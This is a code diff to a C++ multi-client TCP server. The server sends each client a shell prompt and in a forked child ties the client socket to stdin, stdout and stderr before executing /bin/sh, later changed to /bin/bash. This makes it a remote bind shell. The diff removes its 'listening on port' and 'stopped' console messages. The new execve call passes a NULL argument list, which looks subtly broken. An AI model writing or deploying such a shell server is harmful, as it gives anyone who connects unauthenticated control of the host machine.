@@ -1,6 +1,7 @@
 #include "server.hpp"
 #include <sys/wait.h> // Add this line
 #include <fstream>
+
 Server::Server() : addrlen(sizeof(address)) {
     int opt = 1;
     server_fd = socket(AF_INET, SOCK_STREAM, 0);
@@ -16,7 +17,6 @@ Server::~Server() {
     for (int client_socket : clients) 
         close(client_socket);
     close(server_fd);
-    std::cout << "Server stopped." << std::endl;
 }
 
 
@@ -30,8 +30,6 @@ void Server::bind_and_listen() {
 
     if (listen(server_fd, MAX_CLIENTS) < 0)
         throw std::runtime_error("Listen failed");
-
-    std::cout << "Server listening on port " << PORT << std::endl;
 }
 
 
@@ -67,7 +65,6 @@ void Server::handle_client(int client_socket) {
 
     char buffer[1024];
     while (true) {
-        // Send a prompt
         const char* prompt = "$ ";
         send(client_socket, prompt, strlen(prompt), 0);
 
@@ -75,9 +72,8 @@ void Server::handle_client(int client_socket) {
         int bytes_read = recv(client_socket, buffer, sizeof(buffer), 0);
         if (bytes_read <= 0) {
             std::cout << "Client " << client_socket << " disconnected." << std::endl;
-            if (log.is_open()) {
+            if (log.is_open())
                 log << "Client " << client_socket << " disconnected." << std::endl;
-            }
             break;
         }
 
@@ -100,8 +96,8 @@ void Server::handle_client(int client_socket) {
                 dup2(client_socket, STDOUT_FILENO); // Redirect stdout to client
                 dup2(client_socket, STDERR_FILENO); // Redirect stderr to client
                 dup2(client_socket, STDIN_FILENO);  // Redirect stdin from client
-                execl("/bin/sh", "sh", NULL);       // Execute the shell
-                exit(0); // Exit if execl fails
+                execve("/bin/bash", NULL, NULL);
+                exit(0); 
             } else 
                 wait(NULL);
         } else
@@ -119,7 +115,7 @@ void Server::handle_connections() {
         std::lock_guard<std::mutex> lock(clients_mutex);
         clients.push_back(client_socket);
         std::thread(&Server::handle_client, this, client_socket).detach();
-        std::cout << "New client connected: " << client_socket << std::endl;
+            std::cout << "New client connected: " << client_socket << std::endl;
     }
 }
 
